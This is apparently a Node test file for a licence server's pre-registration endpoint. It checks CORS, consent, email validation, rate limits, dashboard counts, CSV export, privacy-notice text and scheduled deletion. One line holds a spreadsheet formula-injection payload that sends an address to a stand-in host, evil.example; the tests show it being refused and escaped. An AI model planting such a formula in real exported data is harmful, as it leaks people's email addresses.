// Pre-registration (src/preorder.js, table preorders in src/stats.js): the site's popup and the dashboard's 사전예약 tab.
// Fake KV, the real Stats class on node:sqlite; global fetch refuses everything: nothing leaves this machine.
//   node test_preorder.mjs
import assert from "node:assert/strict";
import { generateKeyPairSync } from "node:crypto";
import { DatabaseSync } from "node:sqlite";
import worker from "./src/index.js";
import { fakeStats } from "./fake_stats.mjs";
import { PRE, preEmail, preId } from "./src/preorder.js";
import { Stats } from "./src/stats.js";
import { _forgetIpLimits } from "./src/iplimit.js";

const kv = new Map();
let kvWrites = 0;
const st = fakeStats();
const { privateKey } = generateKeyPairSync("ec", { namedCurve: "P-256" });
const TOKEN = "T".repeat(32);
const env = {
  LICENSES: {
    get: async k => kv.get(k) ?? null,
    getWithMetadata: async k => ({ value: kv.get(k) ?? null, metadata: null }),
    put: async (k, v) => { kvWrites++; kv.set(k, v); },
    delete: async k => { kv.delete(k); },
    list: async ({ prefix }) => ({ keys: [...kv.keys()].filter(k => k.startsWith(prefix)).map(name => ({ name })), list_complete: true }),
  },
  LICENSE_PRIVATE_KEY: privateKey.export({ type: "pkcs8", format: "pem" }),
  ADMIN_TOKEN: TOKEN,
  PUBLIC_URL: "https://lic.example",
  STATS: st.binding,
};
globalThis.fetch = async url => assert.fail("no network in this test: " + url);

const SITE = "https://doku-web.github.io";
let ip = 0;   // each call from its own /24 unless an address is given (the network limit is tested on its own)
const call = (path, init = {}, addr) => worker.fetch(new Request("https://lic.example" + path,
  { ...init, headers: { "CF-Connecting-IP": addr || "10.9." + (++ip & 255) + ".1", ...(init.headers || {}) } }), env);
const j = async (path, init, addr) => { const r = await call(path, init, addr); return { http: r.status, cors: r.headers.get("access-control-allow-origin"), ...(await r.json()) }; };
const post = (body, headers = {}, addr) => j("/preorder", { method: "POST", headers: { Origin: SITE, "Content-Type": "application/json", ...headers }, body }, addr);
// adConsent (the advertising-mail consent) is sent unless a test says otherwise
const pre = (b, addr) => post(JSON.stringify({ adConsent: true, ...b }), {}, addr);
const adm = (path, body, auth = TOKEN) => j("/admin/api" + path, { method: body ? "POST" : "GET", headers: { Authorization: "Bearer " + auth, "Content-Type": "application/json" }, body: body ? JSON.stringify(body) : undefined });
const rows = () => st.rows("SELECT * FROM preorders ORDER BY at");
const realNow = Date.now;
const at = (iso, f) => { const before = Date.now; Date.now = () => Date.parse(iso); try { return f(); } finally { Date.now = before; } };
// what the dashboard's numbers must be, counted from the table itself
const brute = () => {
  const all = rows(), seen = Number(st.rows("SELECT v FROM meta WHERE k = 'pre_seen'")[0]?.v || 0);
  const since = Date.parse(new Date(Date.now() + 9 * 36e5).toISOString().slice(0, 10) + "T00:00:00+09:00");
  const by = f => all.reduce((o, r) => (o[r[f]] = (o[r[f]] || 0) + 1, o), {});
  return { count: all.length, fresh: all.filter(r => r.at > seen).length, today: all.filter(r => r.at >= since).length, byPlan: by("plan"), byLang: by("lang") };
};
const numbers = l => ({ count: l.count, fresh: l.fresh, today: l.today, byPlan: l.byPlan, byLang: l.byLang });

// open before the deadline: anyone may ask (CORS *); the preflight answers the official site only, by name
Date.now = () => Date.parse("2026-11-20T03:00:00Z");
let r = await j("/preorder");
assert.deepEqual([r.http, r.open, r.until, r.cors], [200, true, PRE.until, "*"]);
let opt = await call("/preorder", { method: "OPTIONS", headers: { Origin: SITE, "Access-Control-Request-Method": "POST" } });
assert.deepEqual([opt.status, opt.headers.get("access-control-allow-origin"), opt.headers.get("vary")], [204, SITE, "Origin"]);
assert.match(opt.headers.get("access-control-allow-headers"), /content-type/);
for (const o of [undefined, "https://evil.example", "https://doku-web.github.io.evil.example"]) {
  opt = await call("/preorder", { method: "OPTIONS", headers: o ? { Origin: o } : {} });
  assert.deepEqual([opt.status, opt.headers.get("access-control-allow-origin")], [403, null], String(o));
}

// a sign-up only from the official site and only as JSON: another page (even a text/plain form, which needs no
// preflight) gets 403/415, no CORS header, and nothing is written or counted
for (const h of [{ Origin: "" }, { Origin: "https://evil.example" }, { Origin: "null" }]) {
  r = await post(JSON.stringify({ email: "x@example.com", consent: true }), h);
  assert.deepEqual([r.http, r.error, r.cors], [403, "origin", null], JSON.stringify(h));
}
for (const type of ["text/plain", "application/x-www-form-urlencoded", "multipart/form-data; boundary=x", ""]) {
  r = await post(JSON.stringify({ email: "x@example.com", consent: true }), { "Content-Type": type });
  assert.deepEqual([r.http, r.error, r.cors], [415, "type", SITE], type);
}
assert.equal(rows().length, 0);
assert.equal(st.rows("SELECT COUNT(*) AS n FROM counters WHERE name LIKE 'pre:%'")[0].n, 0, "a refused request is not counted");
// PREORDER_ORIGINS (comma-separated) replaces the list: a local copy of the site for tests, say
env.PREORDER_ORIGINS = " http://127.0.0.1:8791 , ";
assert.equal((await post("{}", { Origin: "http://127.0.0.1:8791" })).error, "consent");
assert.equal((await post("{}")).error, "origin", "the default is replaced, not added to");
env.PREORDER_ORIGINS = "http://127.0.0.1:8791, https://doku-web.github.io/";
assert.equal((await post("{}")).error, "consent");
delete env.PREORDER_ORIGINS;

// consent and email are checked; nothing is written for a refusal
assert.deepEqual([(await pre({ email: "a@b.com", plan: "ultra" })).error], ["consent"]);
// the advertising-mail consent is its own: missing, false or anything but true is the same 400 consent, nothing written
for (const ad of [undefined, false, "true", 1, null]) {
  const b = { email: "ad@example.com", plan: "free", consent: true, ...(ad === undefined ? {} : { adConsent: ad }) };
  r = await post(JSON.stringify(b));
  assert.deepEqual([r.http, r.error, r.cors], [400, "consent", SITE], "adConsent " + String(ad));
}
assert.deepEqual([(await post(JSON.stringify({ email: "ad@example.com", adConsent: true })))].map(x => [x.http, x.error])[0], [400, "consent"], "adConsent alone is not consent");
assert.deepEqual([(await pre({ email: "not-mail", consent: true })).error], ["email"]);
assert.deepEqual([(await pre({ email: "a".repeat(250) + "@b.com", consent: true })).error], ["email"]);
assert.equal(rows().length, 0);

// a sign-up (charset in the type is fine); the same address in other case writes nothing; no KV write at all
r = await post(JSON.stringify({ email: "  Fan@Example.com ", plan: "ultra", lang: "en", consent: true, adConsent: true }), { "Content-Type": "application/json; charset=UTF-8" });
assert.deepEqual([r.http, r.ok, r.already, r.cors], [200, true, undefined, SITE]);
const fresh1 = r;
r = await pre({ email: "fan@example.COM", plan: "free", lang: "en", consent: true });
// the same answer as a new sign-up: nobody can ask the server whether an address is on the list
assert.deepEqual(r, fresh1, "an address already there gets the same answer as a new one");
assert.equal(rows().length, 1);
assert.deepEqual([rows()[0].email, rows()[0].plan, rows()[0].lang], ["fan@example.com", "ultra", "ko"], "lang is stored as ko whatever the site sends");
assert.equal(rows()[0].adAt, Date.parse("2026-11-20T03:00:00Z"), "the advertising-mail consent time is kept with the row (ms, like at)");
assert.equal(rows()[0].adAt, rows()[0].at);
assert.equal(kvWrites, 0, "pre-registration writes no KV");
// unknown plan and language fall back; nothing else is stored (no address, no user agent)
await pre({ email: "two@example.com", plan: "lifetime", lang: "xx", consent: true });
assert.deepEqual(Object.keys(rows()[1]).sort(), ["adAt", "at", "email", "id", "lang", "plan"]);
assert.deepEqual([rows()[1].plan, rows()[1].lang], ["undecided", "ko"]);
assert.equal(preEmail("x@y.z"), null);

// addresses: real ones (with + and dots) pass; nothing a spreadsheet would run as a formula, no quote, comma or space,
// no non-ASCII. The first version took the HYPERLINK one: opened in Excel or Sheets it sends cell A2 (an address) away.
const FORMULA = '=hyperlink("http://evil.example/?"&a2&"@a.bc","x")';
for (const ok of ["first.last+tag@sub.example.co.kr", "user_1@naver.com", "1234@daum.net", "o'brien@example.ie", "a-b@my-site.example", "x@example.xn--3e0b707e"])
  assert.equal(preEmail(ok), ok, ok);
assert.equal(preEmail("  First.Last+Tag@Gmail.COM "), "first.last+tag@gmail.com");
for (const bad of [FORMULA, "=cmd@example.com", "+1@example.com", "-x@example.com", "@a@example.com", '"a"@example.com', "a,b@example.com",
                   "a b@example.com", "홍길동@example.com", "a@例え.jp", "a@example.c", "a@-x.com", "a@x-.com", "a@example.123", ".a@example.com", "a@example"])
  assert.equal(preEmail(bad), null, bad);
r = await pre({ email: FORMULA, consent: true });
assert.deepEqual([r.http, r.error], [400, "email"]);
assert.equal(rows().length, 2, "a refused address writes nothing");

// A body over PRE.body (2 KB) is refused unread (413) and not counted; a body that is not a JSON object is a consent error
assert.equal(PRE.body, 2048);
let big = await post(JSON.stringify({ email: "big@example.com", consent: true, pad: "x".repeat(PRE.body) }), {}, "10.8.8.8");
assert.deepEqual([big.http, big.error, big.cors], [413, "body", SITE]);
big = await post(JSON.stringify({ email: "big@example.com", consent: true, pad: "x".repeat(1 << 20) }), {}, "10.8.8.8");
assert.equal(big.http, 413);
big = await call("/preorder", { method: "POST", headers: { Origin: SITE, "Content-Type": "application/json", "Content-Length": String(PRE.body + 1) }, body: "{}" }, "10.8.8.8");
assert.equal(big.status, 413, "a Content-Length over the limit is refused unread");
assert.equal((await post("null", {}, "10.8.8.8")).http, 400);
assert.equal(rows().length, 2);

// per address: 5 an hour, counted by the Stats object with the sign-up, so a new isolate (empty memory) does not reset it
for (let i = 0; i < 5; i++) assert.equal((await pre({ email: `ip${i}@example.com`, consent: true }, "10.8.8.8")).ok, true);
r = await pre({ email: "ip6@example.com", consent: true }, "10.8.8.8");
assert.deepEqual([r.http, r.error, r.cors], [429, "busy", SITE]);
_forgetIpLimits();
assert.equal((await pre({ email: "ip6@example.com", consent: true }, "10.8.8.8")).error, "busy", "not reset by a new isolate");
assert.equal((await pre({ email: "fan@example.com", consent: true }, "10.8.8.8")).error, "busy", "an address on the list is counted too");
// per network: 20 an hour from one IPv4 /24 (here 20 hosts, one each), the 21st host is refused, the next /24 is not
for (let i = 1; i <= PRE.perNetHour; i++) assert.equal((await pre({ email: "net@example.com", consent: true }, "10.20.30." + i)).ok, true, "host " + i);
assert.equal((await pre({ email: "net@example.com", consent: true }, "10.20.30.250")).error, "busy");
assert.equal((await pre({ email: "net@example.com", consent: true }, "10.20.31.1")).ok, true);
// IPv6: one /64 is one address (5), and its /48 is one network (20)
for (let i = 0; i < PRE.perIpHour; i++) assert.equal((await pre({ email: "net@example.com", consent: true }, "2001:db8:5:1::" + (i + 1))).ok, true);
assert.equal((await pre({ email: "net@example.com", consent: true }, "2001:db8:5:1:ffff::9")).error, "busy", "the same /64");
for (let i = 2; i <= 16; i++) assert.equal((await pre({ email: "net@example.com", consent: true }, `2001:db8:5:${i}::1`)).ok, true, "/64 number " + i);
assert.equal((await pre({ email: "net@example.com", consent: true }, "2001:db8:5:99::1")).error, "busy", "the /48 has had 20");
assert.equal((await pre({ email: "net@example.com", consent: true }, "2001:db8:6:1::1")).ok, true, "another /48");
assert.equal(rows().length, 8);
// the counts hold salted hashes and the window, never an address, and go at the end of the window (minute 7, the cron)
const names = st.rows("SELECT name, exp FROM counters WHERE name LIKE 'pre:%'");
assert.ok(names.length > 0 && names.every(x => /^pre:(ip|net):[0-9a-f]{16}:2026-11-20T02:07$/.test(x.name)), JSON.stringify(names.slice(0, 3)));
assert.ok(names.every(x => x.exp === Date.parse("2026-11-20T03:07:00Z")), "they end with the window");
assert.ok(!JSON.stringify(names).includes("10.") && !JSON.stringify(names).includes("2001"));
at("2026-11-20T03:06:59Z", () => st.obj.pruneGuard());
assert.equal(st.rows("SELECT COUNT(*) AS n FROM counters WHERE name LIKE 'pre:%'")[0].n, names.length, "kept until the window ends");
at("2026-11-20T03:07:00Z", () => { st.obj.tick(); });   // the hourly cron: deletes before it asks GitHub
assert.equal(st.rows("SELECT COUNT(*) AS n FROM counters WHERE name LIKE 'pre:%'")[0].n, 0, "deleted by the tick when the window ends");
Date.now = () => Date.parse("2026-11-20T03:08:00Z");
assert.equal((await pre({ email: "fan@example.com", consent: true }, "10.8.8.8")).ok, true, "a new window");

// per day cap (Stats /pre/add max): full -> busy. The object refuses a call without the two hashes.
const add = async b => (await st.obj.fetch(new Request("https://stats/pre/add", { method: "POST", body: JSON.stringify({ plan: "free", lang: "en", ip: "a".repeat(16), net: "b".repeat(16), ...b }) }))).json();
assert.equal((await add({ id: "f".repeat(32), email: "cap@example.com", ip: undefined })).error, "bad");
assert.equal((await add({ id: "f".repeat(32), email: "cap@example.com", max: 1 })).error, "full");
// on a full day an address on the list gets the same answer as a new one (the cap is checked first)
assert.equal((await add({ id: await preId("fan@example.com"), email: "fan@example.com", max: 1, ip: "c".repeat(16) })).error, "full");
// rows put straight into the table (as by an earlier version): the totals are counted again when their row is missing
const fill = st.db.prepare("INSERT INTO preorders (id, email, plan, lang, at) VALUES (?, ?, ?, ?, ?)");
st.db.exec("BEGIN");
for (let i = rows().length; i < PRE.perDay; i++) fill.run(("0000" + i).slice(-5).padStart(32, "e"), "filler" + i + "@example.com", "free", "en", Date.now());
st.db.exec("COMMIT");
st.db.exec("DELETE FROM meta WHERE k = 'pre_totals'");
const onList = await pre({ email: "fan@example.com", consent: true }), notOnList = await pre({ email: "new@example.com", consent: true });
assert.deepEqual([onList.http, onList.error], [429, "busy"]);
assert.deepEqual(onList, notOnList, "a full day does not tell who is on the list");
assert.equal((await adm("/preorders")).today, PRE.perDay);
st.db.exec("DELETE FROM preorders WHERE email LIKE 'filler%'");
st.db.exec("DELETE FROM meta WHERE k = 'pre_totals'");
assert.equal(rows().length, 8);

// the object down: busy, never a 500
st.down = true;
r = await pre({ email: "down@example.com", consent: true });
assert.deepEqual([r.http, r.error], [503, "busy"]);
// and the dashboard's calls get a 503 that says so, not the generic 500 "server error"
for (const [p, b] of [["/preorders"], ["/preorders/seen", {}], ["/preorders/export", {}], ["/preorders/delete", { email: "fan@example.com" }]]) {
  const d = await adm(p, b);
  assert.deepEqual([d.http, d.error, d.csv], [503, "통계 저장소에 연결하지 못했어요. 잠시 뒤 다시 시도하세요", undefined], p);
  assert.ok(d.error_en, p);
}
st.down = false;

// admin: unauthorised is refused; the list has counts and no email anywhere; the numbers are the table's
assert.equal((await adm("/preorders", undefined, "wrong-token-xx")).http, 401);
const list = await adm("/preorders");
assert.equal(list.http, 200);
assert.deepEqual([list.count, list.fresh, list.today, list.open, list.shown], [8, 8, 8, true, true]);
assert.deepEqual(numbers(list), brute());
assert.equal(list.byPlan.ultra, 1);
assert.deepEqual(list.byLang, { ko: 8 }, "every sign-up through the site is stored as ko");
assert.ok(!JSON.stringify(list).includes("@"), "no email in the list");
assert.equal(list.recent.length, 8);
// 확인 clears the new count; a later sign-up is new again
assert.equal((await adm("/preorders/seen", {})).ok, true);
assert.equal((await adm("/preorders")).fresh, 0);
Date.now = () => Date.parse("2026-11-20T04:00:00Z");
await pre({ email: "late@example.com", plan: "biz", consent: true });
assert.deepEqual(numbers(await adm("/preorders")), brute());
assert.equal((await adm("/preorders")).fresh, 1);
// 확인 with upTo (the newest sign-up the dashboard showed, ISO or ms): one that came after its last refresh stays new;
// an older tab's upTo does not move 확인 back; a bad upTo is left out (everything there is now)
const shownUpTo = (await adm("/preorders")).recent[0].at;
assert.equal(shownUpTo, "2026-11-20T04:00:00.000Z");
Date.now = () => Date.parse("2026-11-20T04:30:00Z");
await pre({ email: "after-refresh@example.com", consent: true });
assert.equal((await adm("/preorders/seen", { upTo: shownUpTo })).ok, true);
let seenNow = await adm("/preorders");
assert.equal(seenNow.fresh, 1, "the sign-up after the refresh is still new");
assert.deepEqual(seenNow.recent.filter(x => x.fresh).map(x => x.at), ["2026-11-20T04:30:00.000Z"]);
assert.deepEqual(numbers(seenNow), brute());
await adm("/preorders/seen", { upTo: Date.parse("2026-11-20T03:00:00Z") });
assert.equal((await adm("/preorders")).fresh, 1, "an older tab does not move it back");
await adm("/preorders/seen", { upTo: "not a time" });
seenNow = await adm("/preorders");
assert.deepEqual([seenNow.fresh, numbers(seenNow)], [0, brute()]);
assert.equal((await adm("/preorders/delete", { email: "after-refresh@example.com" })).deleted, true);
Date.now = () => Date.parse("2026-11-20T04:00:00Z");

// The free plan reads 5 million rows a day and the dashboard reads every 60 s: neither the read, a sign-up, 확인 nor a
// delete walks the table or sorts it (SQLite's plan for every query they run; an export reads every row on purpose)
st.trace = [];
await adm("/preorders");
await pre({ email: "plan@example.com", consent: true });
await adm("/preorders/seen", {});
await adm("/preorders/delete", { email: "plan@example.com" });
await call("/preorder/unsubscribe", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=late%40example.com" });
await pre({ email: "late@example.com", plan: "biz", consent: true });   // back, for the counts below
const queries = [...new Set(st.trace)].filter(q => /\b(preorders|counters|meta)\b/.test(q));
st.trace = null;
assert.ok(queries.some(q => /ORDER BY at DESC/.test(q)) && queries.some(q => /INSERT INTO preorders/.test(q)), "the traced calls ran");
for (const q of queries) {
  const plan = st.db.prepare("EXPLAIN QUERY PLAN " + q).all().map(x => x.detail);
  assert.ok(!plan.some(d => /^SCAN (TABLE )?\w+$/.test(d) || /TEMP B-TREE/.test(d)), q + "\n  " + plan.join("\n  "));
}
assert.ok(!queries.some(q => /COUNT\(\*\) AS n FROM preorders$/.test(q)), "no count of the whole table");

// export: every email as CSV, logged. A row the first version may have taken (put straight into the table here) that a
// spreadsheet would run as a formula gets a ' in front, inside its quotes: quotes alone do not stop Excel or Sheets.
st.db.prepare("INSERT INTO preorders (id, email, plan, lang, at) VALUES (?, ?, ?, ?, ?)").run(await preId(FORMULA), FORMULA, "free", "en", Date.now());
const ex = await adm("/preorders/export", {});
assert.equal(ex.count, 10);
assert.match(ex.csv, /^email,plan,lang,at,adAt\r\n/, "adAt is the last column; the ones before it are as they were");
assert.match(ex.csv, /\r\nfan@example\.com,ultra,ko,2026-11-20T03:00:00\.000Z,2026-11-20T03:00:00\.000Z\r\n/, "adAt as an ISO time");
assert.ok((ex.csv + "\r\n").includes('\r\n"\'=hyperlink(""http://evil.example/?""&a2&""@a.bc"",""x"")",free,en,2026-11-20T04:00:00.000Z,\r\n'),
          "the formula is text; a row taken before adConsent has an empty adAt");
assert.ok(ex.csv.split("\r\n").every(l => l.split(",").length >= 5), "five columns on every line");
assert.ok(!/(^|\r\n|,)"?[=+\-@\t\r]/.test(ex.csv), "no cell starts with = + - @");
assert.deepEqual(numbers(await adm("/preorders")), brute(), "the export counts the totals again (the row put in by hand is in them)");
const log = st.rows("SELECT action, detail FROM audit_log");
assert.ok(log.some(x => x.action === "사전예약 내보내기" && x.detail === "10건"));
assert.ok(!log.some(x => x.detail.includes("@")), "the log names no address");
const acc = st.rows("SELECT action FROM admin_access");
assert.ok(acc.some(x => x.action === "사전예약 메일 내보내기"), "the export is in the admin access log");

// delete by email (any case); the totals follow
assert.deepEqual([(await adm("/preorders/delete", { email: "LATE@example.com" })).deleted], [true]);
assert.deepEqual([(await adm("/preorders/delete", { email: "late@example.com" })).deleted], [false]);
assert.equal((await adm("/preorders/delete", { email: "nope" })).http, 400);
assert.equal(rows().length, 9);
// a row the first version took is found by the delete too
assert.deepEqual([(await adm("/preorders/delete", { email: FORMULA })).deleted], [true]);
assert.equal(rows().length, 8);
assert.deepEqual(numbers(await adm("/preorders")), brute());

// a new day in Korea: "today" starts again, the rest stays
Date.now = () => Date.parse("2026-11-20T15:00:00Z");
const nextDay = await adm("/preorders");
assert.deepEqual([nextDay.today, nextDay.count], [0, 8]);
assert.deepEqual(numbers(nextDay), brute());

// closed after the deadline (and by PREORDER=off); the tab still shows
Date.now = () => Date.parse("2026-11-27T15:00:00Z");
assert.equal((await j("/preorder")).open, false);
r = await pre({ email: "after@example.com", consent: true });
assert.deepEqual([r.http, r.error, r.cors], [403, "closed", SITE]);
const late = await adm("/preorders");
assert.deepEqual([late.open, late.shown, late.count], [false, true, 8]);
Date.now = () => Date.parse("2026-11-21T00:00:00Z");
for (const off of ["off", "OFF", " Off "]) {   // any case: a switch typed "OFF" must not be ignored
  env.PREORDER = off;
  assert.equal((await j("/preorder")).open, false, JSON.stringify(off));
  assert.deepEqual([(await pre({ email: "off@example.com", consent: true })).error], ["closed"]);
}
env.PREORDER = "on";
assert.equal((await j("/preorder")).open, true);
delete env.PREORDER;
env.PREORDER_UNTIL = "2026-11-20T00:00:00Z";
assert.equal((await j("/preorder")).open, false);
delete env.PREORDER_UNTIL;

// a table left by the first version (rows, no index, no totals row): this version adds the index and counts the totals
const oldDb = new DatabaseSync(":memory:");
oldDb.exec(`CREATE TABLE meta (k TEXT PRIMARY KEY, v TEXT NOT NULL) WITHOUT ROWID;
CREATE TABLE preorders (id TEXT PRIMARY KEY, email TEXT NOT NULL, plan TEXT NOT NULL, lang TEXT NOT NULL, at INTEGER NOT NULL) WITHOUT ROWID;`);
for (const [e, p, l, t] of [["a@x.com", "ultra", "ko", "2026-11-19T10:00:00Z"], ["b@x.com", "free", "ko", "2026-11-20T16:00:00Z"], ["c@x.com", "free", "ja", "2026-11-20T17:00:00Z"]])
  oldDb.prepare("INSERT INTO preorders VALUES (?, ?, ?, ?, ?)").run(await preId(e), e, p, l, Date.parse(t));
const st2 = fakeStats(Stats, oldDb);
assert.equal(oldDb.prepare("SELECT COUNT(*) AS n FROM sqlite_master WHERE type = 'index' AND name = 'preorders_at'").get().n, 1);
const r2 = at("2026-11-21T00:00:00Z", () => st2.obj.pre("/pre/read", { recent: 10 }));
assert.deepEqual([r2.count, r2.today, r2.fresh, r2.byPlan, r2.byLang, r2.recent.length], [3, 2, 3, { ultra: 1, free: 2 }, { ko: 2, ja: 1 }, 3]);
// adAt is added to that table as a nullable column: the old rows stay, with adAt null, and export with it empty
assert.ok(oldDb.prepare("SELECT name FROM pragma_table_info('preorders')").all().some(c => c.name === "adAt"), "the adAt column was added");
assert.deepEqual(oldDb.prepare("SELECT email, adAt FROM preorders ORDER BY at").all().map(x => [x.email, x.adAt]), [["a@x.com", null], ["b@x.com", null], ["c@x.com", null]]);
const st3 = fakeStats(Stats, oldDb);   // a second start on the migrated table changes nothing
assert.equal(oldDb.prepare("SELECT COUNT(*) AS n FROM pragma_table_info('preorders') WHERE name = 'adAt'").get().n, 1);
const ex2 = at("2026-11-21T00:00:00Z", () => st3.obj.pre("/pre/export", {}));
assert.deepEqual(ex2.rows.map(x => x.adAt), [null, null, null]);
// an old row whose address signs up again with adConsent gets its time (the answer is the same "already")
const again = at("2026-11-21T01:00:00Z", () => st3.obj.pre("/pre/add", { id: "0".repeat(32), email: "x", plan: "free", lang: "ko", ip: "a".repeat(16), net: "b".repeat(16) }));
assert.equal(again.ok, true);
const oldId = await preId("a@x.com");
assert.equal(at("2026-11-21T01:00:00Z", () => st3.obj.pre("/pre/add", { id: oldId, email: "a@x.com", plan: "free", lang: "ko", ad: true, ip: "a".repeat(16), net: "b".repeat(16) })).already, true);
assert.equal(oldDb.prepare("SELECT adAt FROM preorders WHERE id = ?").get(oldId).adAt, Date.parse("2026-11-21T01:00:00Z"));
assert.equal(oldDb.prepare("SELECT adAt FROM preorders WHERE id = ?").get("0".repeat(32)).adAt, null, "no ad: no adAt");

// /privacy: the policy in force (privacy_prev_page.js, word for word) gets the pre-registration notice while the rows
// exist (support.js withPreorder): a box under the date and the section #preorder that the site's consent text links
const page = async (path, iso) => {
  Date.now = () => Date.parse(iso);
  try { const r = await call(path); return { http: r.status, text: await r.text() }; } finally { Date.now = realNow; }
};
for (const [q, words] of [
  ["", ["별도 안내: 공식 사이트 사전예약", "메일 주소, 관심 플랜, 사이트 언어, 신청 시각, 광고성 정보 수신 동의 시각", "2026년 11월 20일부터 적용해요",
        "수신 거부는 https://systemboost-license.euning97.workers.dev/preorder/unsubscribe 에 신청한 메일 주소만 넣으면 바로 돼요",
        "사전예약 창에서 동의 칸에 체크한 경우만, 2026년 11월 27일 23:59(한국 시간)까지 받아요. 만 14세 이상만",
        "2027년 2월 28일에 서버에서 모두 지워요", "Cloudflare(제4조)", "동의하지 않아도 돼요", "제5조의 방법(웹 /help, 제10조의 메일)"]],
  ["?lang=en", ["Separate notice: pre-registration on the official site", "Email address, plan of interest, site language, time of sign-up, time of consent to receive advertising information",
                "To unsubscribe, enter that address at https://systemboost-license.euning97.workers.dev/preorder/unsubscribe",
                "It applies from November 20, 2026.", "until November 27, 2026, 23:59 (Korean time). 14 or older only",
                "All deleted from the server on February 28, 2027", "You may refuse.", "Your rights"]]]) {
  const p = await page("/privacy" + q, "2026-11-21T00:00:00Z");
  assert.equal(p.http, 200);
  for (const w of words) assert.ok(p.text.includes(w), JSON.stringify(q) + " has: " + w);
  assert.ok(p.text.includes('<section id="preorder">') && p.text.includes('<a href="#preorder">'), q + ": the section and the link to it");
  assert.ok(p.text.indexOf('id="preorder-note"') < p.text.indexOf('<nav class="toc"'), q + ": the box is above the contents");
  assert.ok(!/<script|\son\w+=|\bsrc=/i.test(p.text), q + ": no script, nothing loaded");
  // the new policy (?next=1) lists pre-registration in its own articles, without this notice
  const nx = await page("/privacy?next=1" + q.replace("?", "&"), "2026-11-21T00:00:00Z");
  assert.ok(!nx.text.includes('id="preorder') && nx.text.includes(q ? "Pre-registration on the official site" : "공식 사이트의 사전예약"), q + ": ?next=1");
  assert.ok(nx.text.includes(q ? "sign-up time and the time of consent to receive advertising information" : "신청 시각, 광고성 정보 수신 동의 시각")
            && nx.text.includes("https://systemboost-license.euning97.workers.dev/preorder/unsubscribe"), q + ": ?next=1 has the consent time and the unsubscribe page");
  // gone with the rows on 2027-02-28 KST
  assert.ok((await page("/privacy" + q, "2027-02-27T14:59:00Z")).text.includes('id="preorder"'));
  assert.ok(!(await page("/privacy" + q, "2027-02-27T15:00:00Z")).text.includes('id="preorder'), q + ": gone on the day the rows go");
}
env.PREORDER_UNTIL = "2026-11-25T14:59:59Z";
assert.ok((await page("/privacy", "2026-11-21T00:00:00Z")).text.includes("2026년 11월 25일 23:59(한국 시간)까지"), "PREORDER_UNTIL moves the date");
delete env.PREORDER_UNTIL;

// on 2027-02-28 KST everything is deleted: by the hourly tick and by any call; the tab goes away
at("2027-02-27T14:59:00Z", () => st.obj.prePurge());
assert.equal(rows().length, 8, "kept until the day");
// the hourly tick deletes them before it asks GitHub, so a GitHub that never answers does not hold the deletion up
globalThis.fetch = () => new Promise(() => {});
at("2027-02-27T15:00:00Z", () => { st.obj.tick(); });   // not awaited: it waits on GitHub for ever
assert.equal(rows().length, 0, "deleted by the tick at once");
assert.equal(st.rows("SELECT COUNT(*) AS n FROM meta WHERE k IN ('pre_seen', 'pre_totals')")[0].n, 0, "the totals and the 확인 time too");
globalThis.fetch = async url => assert.fail("no network in this test: " + url);
Date.now = () => Date.parse("2027-02-27T16:00:00Z");
const gone = await adm("/preorders");
assert.deepEqual([gone.count, gone.shown, gone.open], [0, false, false]);
Date.now = realNow;

console.log("test_preorder: ok");
